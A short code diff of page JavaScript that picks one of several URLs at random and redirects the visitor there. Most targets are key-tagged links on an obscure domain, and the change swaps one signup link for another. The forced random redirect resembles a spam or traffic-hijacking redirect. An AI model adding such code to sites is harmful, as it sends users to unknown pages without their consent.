@@ -6,7 +6,7 @@ var dataUrl = [
 '//wonderfullytumultbizarre.com/nuudznpz3?key=3d998b3da5397f5ac865ff0734c2be19',
 '//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e',
  '//wonderfullytumultbizarre.com/y425t3d5k?key=b0d195ca768aeab7d18aad598d71b0b0',
- '//dev-filmfj.pantheonsite.io/register'
+ '//filmfj.blogspot.com/redirect_signup'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
